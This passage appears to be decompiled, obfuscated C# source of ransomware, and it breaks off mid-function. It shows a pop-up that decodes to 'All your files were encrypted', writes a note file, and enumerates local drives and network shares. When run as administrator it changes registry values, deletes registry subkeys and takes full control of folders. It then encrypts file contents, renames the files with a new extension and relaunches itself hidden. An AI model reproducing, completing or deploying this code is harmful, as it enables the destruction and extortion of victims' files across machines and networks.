	public static void PTEUBFhKsAzKSYC(string RliuxZjWWnPKD = "SW5mb3JtYXRpb24uLi4=", string WSejTRxMrkn = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(AJakXHzLGH(RliuxZjWWnPKD));
		val.set_BalloonTipText(AJakXHzLGH(WSejTRxMrkn));
		val.ShowBalloonTip(30000);
	}

	public static void rbXGQjfAtoDn(string string_0)
	{
		string text = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1].ToString();
		dfqtCTBwlwyp(getString_0(107399121), getString_0(107399140) + text + getString_0(107399131) + string_0);
	}

	private static void DlfhshYenk()
	{
		//IL_05b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_05b8: Expected O, but got Unknown
		//IL_05d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_05da: Expected O, but got Unknown
		ZoJIiSGwpVOiHY.QKuZlnZSLTl();
		AnDmoVaaCCkNd = ZoJIiSGwpVOiHY.qEmaEHLCsQCWU();
		List<OIaNLxOiTZq> list = OIaNLxOiTZq.WdlhUGTwKMFYj();
		foreach (OIaNLxOiTZq item in list)
		{
			dixQXRkXIIGjW.Add(item.IPAddress);
		}
		rwxrAzKfSkFklG = AnDmoVaaCCkNd.Union(dixQXRkXIIGjW).ToList();
		foreach (string item2 in rwxrAzKfSkFklG)
		{
			if ((!item2.StartsWith(getString_0(107399094)) && !item2.StartsWith(getString_0(107399089)) && !item2.StartsWith(getString_0(107399112)) && !item2.StartsWith(getString_0(107400641))) || !ZoJIiSGwpVOiHY.DvjJTBgYUMwnx(item2))
			{
				continue;
			}
			try
			{
				if (QBzcVPcsFN == getString_0(107396958))
				{
					for (int i = 0; i < ZoJIiSGwpVOiHY.HpOzHcnuWt.Count; i++)
					{
						dfqtCTBwlwyp(getString_0(107399121), getString_0(107399099) + item2 + getString_0(107399058) + ZoJIiSGwpVOiHY.HpOzHcnuWt[i] + getString_0(107399131) + ZoJIiSGwpVOiHY.GEcbsWJzeRL[i]);
					}
				}
				else
				{
					dfqtCTBwlwyp(getString_0(107399121), getString_0(107399099) + item2);
				}
			}
			catch
			{
			}
		}
		try
		{
			ZoJIiSGwpVOiHY.iGRorTAIXIBMI iGRorTAIXIBMI = new ZoJIiSGwpVOiHY.iGRorTAIXIBMI(ZoJIiSGwpVOiHY.SeiQYJqHazNAQzu.ywwepuLddvvs, ZoJIiSGwpVOiHY.MjKvHMgmJBZ.wmdcjGBBefoHIm, ZoJIiSGwpVOiHY.gJIZWpVOJyeyY.GfLuVOKCHOyAnRV, ZoJIiSGwpVOiHY.RoDViMiAsBq.mESSPcohxxgFXB);
			foreach (string item3 in iGRorTAIXIBMI)
			{
				MatchCollection matchCollection = Regex.Matches(item3, getString_0(107399077));
				foreach (Match item4 in matchCollection)
				{
					try
					{
						if (QBzcVPcsFN == getString_0(107396958))
						{
							for (int j = 0; j < ZoJIiSGwpVOiHY.HpOzHcnuWt.Count; j++)
							{
								dfqtCTBwlwyp(getString_0(107399121), getString_0(107398452) + item4.ToString() + getString_0(107399058) + ZoJIiSGwpVOiHY.HpOzHcnuWt[j] + getString_0(107399131) + ZoJIiSGwpVOiHY.GEcbsWJzeRL[j]);
							}
						}
						else
						{
							dfqtCTBwlwyp(getString_0(107399121), getString_0(107398452) + item4.ToString());
						}
					}
					catch
					{
					}
					if (!kGOGGuScmQTRuRt.Contains(item4.ToString()))
					{
						kGOGGuScmQTRuRt.Add(item4.ToString());
					}
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string string_ = izMuybnTAClZSoX(getString_0(107398776));
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(AJakXHzLGH(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue(AJakXHzLGH(getString_0(107398443)), 1, RegistryValueKind.DWord);
					registryKey.SetValue(AJakXHzLGH(getString_0(107398386)), 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
		}
		if (NCEWjFyNHHvX == getString_0(107396958))
		{
			try
			{
				string text = Path.GetTempFileName().Replace(getString_0(107398373), getString_0(107398364));
				File.WriteAllText(text, AJakXHzLGH(getString_0(107398323)), Encoding.ASCII);
				dfqtCTBwlwyp(getString_0(107396811), getString_0(107397237) + text);
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107397232))))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107397232)));
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107397255))))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107397255)));
				}
			}
			catch
			{
			}
		}
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107397246));
		ManagementObjectEnumerator enumerator5 = val.Get().GetEnumerator();
		try
		{
			while (enumerator5.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator5.get_Current();
				if (!kGOGGuScmQTRuRt.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107397673), getString_0(107396816)).Replace(getString_0(107397700), getString_0(107397673))
					.Replace(getString_0(107397691), getString_0(107400641))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					kGOGGuScmQTRuRt.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107397673), getString_0(107396816)).Replace(getString_0(107397700), getString_0(107397673))
						.Replace(getString_0(107397691), getString_0(107400641))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107397654), getString_0(107400641)) + getString_0(107397645));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator5)?.Dispose();
		}
	}

	public static bool lFqubDkbQuyEda()
	{
		WebRequest webRequest = WebRequest.Create(getString_0(107397668));
		try
		{
			webRequest.GetResponse();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static void KzgInVtpzgYN(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = AJakXHzLGH(getString_0(107397635));
		processStartInfo.Arguments = getString_0(107397606) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool zLCpNNDmAtopaFC(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool llHCAjJugKK(string string_0)
	{
		try
		{
			KDnXzLyoGZRl CS_0024_003C_003E8__locals0 = new KDnXzLyoGZRl();
			DriveInfo[] drives = DriveInfo.GetDrives();
			CS_0024_003C_003E8__locals0.WFXPyxDTqW = Path.GetPathRoot(string_0);
			DriveInfo driveInfo = drives.FirstOrDefault((DriveInfo driveInfo_0) => driveInfo_0.RootDirectory.Name == CS_0024_003C_003E8__locals0.WFXPyxDTqW);
			return driveInfo != null && driveInfo.DriveFormat == getString_0(107397601);
		}
		catch
		{
			return false;
		}
	}

	public static string ayItgFuYWuh(SecureString secureString_0)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(secureString_0);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void fnKTYJlSLVr()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = izMuybnTAClZSoX(getString_0(107397560));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(AJakXHzLGH(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(AJakXHzLGH(getString_0(107364142)));
					registryKey.DeleteSubKey(AJakXHzLGH(getString_0(107364117)));
					registryKey.DeleteSubKey(AJakXHzLGH(getString_0(107364132)));
					registryKey.DeleteSubKey(AJakXHzLGH(getString_0(107364075)));
					registryKey.DeleteSubKey(AJakXHzLGH(getString_0(107397635)));
					registryKey.DeleteSubKey(AJakXHzLGH(getString_0(107364050)));
					registryKey.DeleteSubKey(AJakXHzLGH(getString_0(107364021)));
					registryKey.Close();
				}
				string_ = izMuybnTAClZSoX(getString_0(107364036));
				registryKey = Registry.LocalMachine.OpenSubKey(AJakXHzLGH(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(AJakXHzLGH(getString_0(107364451)));
					registryKey.Close();
				}
				string_ = izMuybnTAClZSoX(getString_0(107364402));
				registryKey = Registry.LocalMachine.OpenSubKey(AJakXHzLGH(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(AJakXHzLGH(getString_0(107364451)));
					registryKey.Close();
				}
				string_ = izMuybnTAClZSoX(getString_0(107364402));
				registryKey = Registry.CurrentUser.OpenSubKey(AJakXHzLGH(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(AJakXHzLGH(getString_0(107364451)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			dfqtCTBwlwyp(AJakXHzLGH(getString_0(107364417)), AJakXHzLGH(getString_0(107364368)));
			dfqtCTBwlwyp(AJakXHzLGH(getString_0(107364351)), AJakXHzLGH(getString_0(107364310)));
			dfqtCTBwlwyp(AJakXHzLGH(getString_0(107364351)), AJakXHzLGH(getString_0(107363684)));
			dfqtCTBwlwyp(AJakXHzLGH(getString_0(107363623)), AJakXHzLGH(getString_0(107363574)));
		}
		catch
		{
		}
	}

	public static void jPPfleEdfBACeW(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(AJakXHzLGH(getString_0(107363501)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void nqbdGYjNXfcb()
	{
		string string_ = izMuybnTAClZSoX(getString_0(107363476));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(AJakXHzLGH(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(AJakXHzLGH(getString_0(107363939)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void NfybKqnWcJrqY()
	{
		dfqtCTBwlwyp(getString_0(107396811), AJakXHzLGH(getString_0(107363906)));
		string text = AJakXHzLGH(getString_0(107363712));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107397691) + text + getString_0(107397691) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107396811);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void ZTSNWrphNXPrPP(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
		}
		catch (Exception ex)
		{
			if (nCZIbbbLUfspycLk)
			{
				try
				{
					File.AppendAllText(VjgrxEUFvvHY, getString_0(107363135) + string_0 + getString_0(107363094) + ex.Message + getString_0(107396267));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string SIfyghAFRdICD()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107400641);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107363037);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107363028))) ? getString_0(107363042) : getString_0(107363019));
				break;
			case 0:
				text = getString_0(107363065);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107363000);
				break;
			case 4:
				text = getString_0(107362987);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107363001) : getString_0(107363010));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107362982) : getString_0(107395857)) : getString_0(107362955)) : getString_0(107362964));
				break;
			case 10:
				text = getString_0(107362977);
				break;
			}
		}
		if (text != getString_0(107400641))
		{
			text = getString_0(107362972) + text;
			if (oSVersion.ServicePack != getString_0(107400641))
			{
				text = text + getString_0(107399131) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string znZsibIawm(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107411934);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(AJakXHzLGH(getString_0(107411901)));
				streamWriter.WriteLine(getString_0(107396267));
				streamWriter.WriteLine(AJakXHzLGH(getString_0(107408787)));
				streamWriter.WriteLine(string_0);
			}
			else
			{
				File.AppendAllText(text, getString_0(107408197) + string_0);
			}
			return text;
		}
		catch (Exception ex)
		{
			if (nCZIbbbLUfspycLk)
			{
				try
				{
					File.AppendAllText(VjgrxEUFvvHY, getString_0(107362927) + ex.Message + getString_0(107396267));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void PaeYQCUbTYk(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		QYFKNavAtcEa.VZCGPSgOVPlm CS_0024_003C_003E8__locals0 = new QYFKNavAtcEa();
		CS_0024_003C_003E8__locals0.VuwaUFxPVVjFnvE = string_1;
		CS_0024_003C_003E8__locals0.oSqWwAtpkJ = string_2;
		CS_0024_003C_003E8__locals0.YTyfNjYPvgmlaK = string_3;
		CS_0024_003C_003E8__locals0.tSVwlNGureOsOAB = string_4;
		rSFrHwQLaPb = Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.YTyfNjYPvgmlaK);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107396564))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !kGOGGuScmQTRuRt.Contains(array[i].Name))
					{
						kGOGGuScmQTRuRt.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!kGOGGuScmQTRuRt.Contains(string_0[j]))
				{
					kGOGGuScmQTRuRt.Add(string_0[j]);
				}
			}
		}
		if (kGOGGuScmQTRuRt.Contains(AJakXHzLGH(getString_0(107363382))) && XDNbsQcChwzXpL == getString_0(107396958))
		{
			kGOGGuScmQTRuRt.Remove(AJakXHzLGH(getString_0(107363382)));
		}
		Parallel.ForEach(kGOGGuScmQTRuRt, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new QYFKNavAtcEa.VZCGPSgOVPlm();
			CS_0024_003C_003E8__locals0.KQbfqRGiKfpHpp = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.ZobhaGHKKdtIX = string_0;
			if (jLexrErlPOkRYi && !SIfyghAFRdICD().Contains(QYFKNavAtcEa.getString_0(107363011)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						zLCpNNDmAtopaFC(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.ZobhaGHKKdtIX);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (uzPKfOTMfp == QYFKNavAtcEa.getString_0(107396968))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					THyVWCduWKoS(CS_0024_003C_003E8__locals0.ZobhaGHKKdtIX, CS_0024_003C_003E8__locals0.KQbfqRGiKfpHpp.VuwaUFxPVVjFnvE, CS_0024_003C_003E8__locals0.KQbfqRGiKfpHpp.tSVwlNGureOsOAB, CS_0024_003C_003E8__locals0.KQbfqRGiKfpHpp.oSqWwAtpkJ, CS_0024_003C_003E8__locals0.KQbfqRGiKfpHpp.YTyfNjYPvgmlaK);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				THyVWCduWKoS(CS_0024_003C_003E8__locals0.ZobhaGHKKdtIX, CS_0024_003C_003E8__locals0.VuwaUFxPVVjFnvE, CS_0024_003C_003E8__locals0.tSVwlNGureOsOAB, CS_0024_003C_003E8__locals0.oSqWwAtpkJ, CS_0024_003C_003E8__locals0.YTyfNjYPvgmlaK);
			}
		});
	}

	public static void THyVWCduWKoS(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107400641));
		List<string> list3 = list2;
		if (FCzRfrTLNJh == getString_0(107396415))
		{
			if (EFFiYUumCeri == getString_0(107396958) && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && llHCAjJugKK(string_0))
			{
				tCyICKPEHtVB tCyICKPEHtVB = null;
				try
				{
					tCyICKPEHtVB = new tCyICKPEHtVB(string_0.Replace(getString_0(107396816), getString_0(107400641)));
				}
				catch
				{
					list = QRkWvCgAxAtr(string_0, string_1, string_2, string_3, string_4);
					return;
				}
				try
				{
					yJfHDyDKAPg(tCyICKPEHtVB.ToArray().ToList(), string_1, string_2, string_3, string_4);
					return;
				}
				catch (Exception)
				{
					list = QRkWvCgAxAtr(string_0, string_1, string_2, string_3, string_4);
					return;
				}
			}
			list = QRkWvCgAxAtr(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = kMdwmiFmEwFc.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0457;
					}
				}
				if ((nyibzDOcmzAfPlAk == getString_0(107396415) && !item.EndsWith(text)) || meZsVdOPaL.Contains(item))
				{
					continue;
				}
				if (hEqjITdFNHN == getString_0(107396958))
				{
					try
					{
						if (cTRLNsgdQpdHDjH.IwGNMUOZCbK(item))
						{
							cTRLNsgdQpdHDjH.QJiNPENvLKcP(item);
						}
					}
					catch
					{
					}
				}
				meZsVdOPaL.Add(item);
				if (!XMwazMiiElRCF.Contains(Path.GetDirectoryName(item)))
				{
					XMwazMiiElRCF.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (IIzcsAXxpCcBT == getString_0(107396958) && fileStream.Length > Convert.ToInt32(nnEkTZqriSbg) * 1024 * 1024 && !list3.Contains(text))
					{
						if (PFlwcndeNzM == getString_0(107396958))
						{
							foreach (string item2 in YEHhRPAlgeTZv)
							{
								if (item.ToLower().EndsWith(item2) && qIWeOYgtZSNt == getString_0(107396958))
								{
									if (Convert.ToInt32(BIwQlRShpHJfwXLx) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											ApOKuNWkxqSR.IxYjJLTMXDzuQu(getString_0(107400722), getString_0(107400689), getString_0(107400712), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && qIWeOYgtZSNt == getString_0(107396415))
								{
									try
									{
										ApOKuNWkxqSR.IxYjJLTMXDzuQu(getString_0(107400722), getString_0(107400689), getString_0(107400712), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = WZCHsryCBLJ.gsYSnbeqzsbU(item, Convert.ToInt32(nnEkTZqriSbg) * 1024 * 1024);
						byte[] qznoWitgOpFxI = WZCHsryCBLJ.UMjuORBkcFPFXB(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						WZCHsryCBLJ.MGSLxQyqoUi(item, qznoWitgOpFxI);
						if (string_2 != getString_0(107363373))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107363373))
					{
						KHTGEVGMyJo(item, item + string_2, rSFrHwQLaPb);
					}
					else
					{
						KHTGEVGMyJo(item, item + getString_0(107363400), rSFrHwQLaPb);
					}
				}
				catch (Exception)
				{
				}
				IL_0457:;
			}
		}
	}

	public static void yJfHDyDKAPg(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		mBAKpdaxgGIiSOo.ApqFwhdfUUGrS CS_0024_003C_003E8__locals0 = new mBAKpdaxgGIiSOo();
		CS_0024_003C_003E8__locals0.WvtPVeZAyOd = list_0;
		CS_0024_003C_003E8__locals0.RhFnHiViAutuY = string_1;
		CS_0024_003C_003E8__locals0.ohFsjVpBGxFMK = string_2;
		CS_0024_003C_003E8__locals0.sQDDlGRIPwQjFTV = string_3;
		CS_0024_003C_003E8__locals0.oPxEmDobEjFJfN = new List<string> { getString_0(107400641) };
		if (nyibzDOcmzAfPlAk == getString_0(107396415))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.WvtPVeZAyOd)
				{
					if (!item.Contains(mBAKpdaxgGIiSOo.getString_0(107400143)) && !item.Contains(mBAKpdaxgGIiSOo.getString_0(107400118)) && !item.Contains(mBAKpdaxgGIiSOo.getString_0(107400085)) && !item.ToLower().Contains(mBAKpdaxgGIiSOo.getString_0(107399524)) && !item.ToLower().Contains(mBAKpdaxgGIiSOo.getString_0(107399543)) && !item.Contains(mBAKpdaxgGIiSOo.getString_0(107399486)) && !item.Contains(mBAKpdaxgGIiSOo.getString_0(107399465)) && !item.ToLower().Contains(mBAKpdaxgGIiSOo.getString_0(107399480)) && !item.ToLower().Contains(mBAKpdaxgGIiSOo.getString_0(107399467)) && !item.ToLower().Contains(mBAKpdaxgGIiSOo.getString_0(107399398)) && !item.ToLower().Contains(mBAKpdaxgGIiSOo.getString_0(107399389)) && !item.ToLower().Contains(mBAKpdaxgGIiSOo.getString_0(107399404)) && !item.ToLower().Contains(mBAKpdaxgGIiSOo.getString_0(107399378)) && !item.ToLower().Contains(mBAKpdaxgGIiSOo.getString_0(107399325)) && !item.Contains(mBAKpdaxgGIiSOo.getString_0(107399300)) && !item.Contains(mBAKpdaxgGIiSOo.getString_0(107399315)) && !item.Contains(mBAKpdaxgGIiSOo.getString_0(107399778)) && !item.Contains(mBAKpdaxgGIiSOo.getString_0(107399793)) && !item.Contains(mBAKpdaxgGIiSOo.getString_0(107399744)) && !item.Contains(mBAKpdaxgGIiSOo.getString_0(107399759)) && !item.Contains(mBAKpdaxgGIiSOo.getString_0(107399710)) && !item.Contains(mBAKpdaxgGIiSOo.getString_0(107399725)) && !item.Contains(mBAKpdaxgGIiSOo.getString_0(107399680)) && !item.Contains(mBAKpdaxgGIiSOo.getString_0(107399691)) && !item.ToLower().Contains(mBAKpdaxgGIiSOo.getString_0(107399646)) && !item.ToLower().Contains(mBAKpdaxgGIiSOo.getString_0(107399665)) && !item.ToLower().Contains(mBAKpdaxgGIiSOo.getString_0(107399616)) && !item.ToLower().Contains(mBAKpdaxgGIiSOo.getString_0(107399631)) && !item.Contains(AJakXHzLGH(mBAKpdaxgGIiSOo.getString_0(107399582))) && !item.Contains(mBAKpdaxgGIiSOo.getString_0(107399557)) && !item.Contains(mBAKpdaxgGIiSOo.getString_0(107399576)) && !item.EndsWith(CS_0024_003C_003E8__locals0.RhFnHiViAutuY) && !item.EndsWith(mBAKpdaxgGIiSOo.getString_0(107399007)) && !item.EndsWith(mBAKpdaxgGIiSOo.getString_0(107399034)) && !item.EndsWith(mBAKpdaxgGIiSOo.getString_0(107399029)) && !item.EndsWith(mBAKpdaxgGIiSOo.getString_0(107399024)) && !item.Contains(mBAKpdaxgGIiSOo.getString_0(107399019)) && !item.Contains(UCnmTIRKyzLvN) && !item.Contains(VjgrxEUFvvHY) && !item.Contains(jUdQCPAqaGpC))
					{
						if (CS_0024_003C_003E8__locals0.ohFsjVpBGxFMK.Length != 0)
						{
							string[] ohFsjVpBGxFMK2 = CS_0024_003C_003E8__locals0.ohFsjVpBGxFMK;
							int num2 = 0;
							while (num2 < ohFsjVpBGxFMK2.Length)
							{
								string value2 = ohFsjVpBGxFMK2[num2];
								if (!item.EndsWith(value2))
								{
									num2++;
									continue;
								}
								goto IL_0b4a;
							}
						}
						try
						{
							if (item.EndsWith(CS_0024_003C_003E8__locals0.RhFnHiViAutuY))
							{
								goto IL_0b4a;
							}
						}
						catch (Exception)
						{
							goto IL_0b4a;
						}
						if (item.EndsWith(string_0) && !meZsVdOPaL.Contains(item))
						{
							if (hEqjITdFNHN == mBAKpdaxgGIiSOo.getString_0(107396976))
							{
								try
								{
									if (cTRLNsgdQpdHDjH.IwGNMUOZCbK(item))
									{
										cTRLNsgdQpdHDjH.QJiNPENvLKcP(item);
									}
								}
								catch
								{
								}
							}
							meZsVdOPaL.Add(item);
							if (!XMwazMiiElRCF.Contains(Path.GetDirectoryName(item)))
							{
								XMwazMiiElRCF.Add(Path.GetDirectoryName(item));
							}
							ZTSNWrphNXPrPP(item);
							try
							{
								try
								{
									if (new FileInfo(item).Length != 0L)
									{
										goto end_IL_0518;
									}
									goto end_IL_0518_2;
									end_IL_0518:;
								}
								catch (Exception ex12)
								{
									if (nCZIbbbLUfspycLk)
									{
										try
										{
											File.AppendAllText(VjgrxEUFvvHY, mBAKpdaxgGIiSOo.getString_0(107363153) + item + mBAKpdaxgGIiSOo.getString_0(107380357) + ex12.Message + mBAKpdaxgGIiSOo.getString_0(107396285));
										}
										catch (Exception)
										{
										}
									}
									goto end_IL_0518_2;
								}
								if (IIzcsAXxpCcBT == mBAKpdaxgGIiSOo.getString_0(107396976) && new FileInfo(item).Length > Convert.ToInt32(nnEkTZqriSbg) * 1024 * 1024 && !CS_0024_003C_003E8__locals0.oPxEmDobEjFJfN.Contains(string_0))
								{
									CS_0024_003C_003E8__locals0 = new mBAKpdaxgGIiSOo.SOFrgJGetW();
									CS_0024_003C_003E8__locals0.oFTrErWbhZo = CS_0024_003C_003E8__locals0;
									try
									{
										if (CS_0024_003C_003E8__locals0.RhFnHiViAutuY != mBAKpdaxgGIiSOo.getString_0(107363391))
										{
											File.Move(item, item + CS_0024_003C_003E8__locals0.RhFnHiViAutuY);
										}
									}
									catch (Exception ex14)
									{
										if (!nCZIbbbLUfspycLk)
										{
											break;
										}
										try
										{
											File.AppendAllText(VjgrxEUFvvHY, mBAKpdaxgGIiSOo.getString_0(107363153) + item + mBAKpdaxgGIiSOo.getString_0(107380808) + ex14.Message + mBAKpdaxgGIiSOo.getString_0(107396285));
											break;
										}
										catch (Exception)
										{
											break;
										}
									}
									CS_0024_003C_003E8__locals0.ksQXTBTzfiDke = mBAKpdaxgGIiSOo.getString_0(107400659);
									if (CS_0024_003C_003E8__locals0.RhFnHiViAutuY != mBAKpdaxgGIiSOo.getString_0(107363391))
									{
										CS_0024_003C_003E8__locals0.ksQXTBTzfiDke = item + CS_0024_003C_003E8__locals0.RhFnHiViAutuY;
									}
									else
									{
										CS_0024_003C_003E8__locals0.ksQXTBTzfiDke = item;
									}
									if (PFlwcndeNzM == mBAKpdaxgGIiSOo.getString_0(107396976))
									{
										Thread thread2 = new Thread((ThreadStart)delegate
										{
											foreach (string item2 in YEHhRPAlgeTZv)
											{
												if (CS_0024_003C_003E8__locals0.ksQXTBTzfiDke.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.oFTrErWbhZo.RhFnHiViAutuY) && qIWeOYgtZSNt == mBAKpdaxgGIiSOo.SOFrgJGetW.getString_0(107396979))
												{
													if (Convert.ToInt32(BIwQlRShpHJfwXLx) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.ksQXTBTzfiDke).Length)
													{
														try
														{
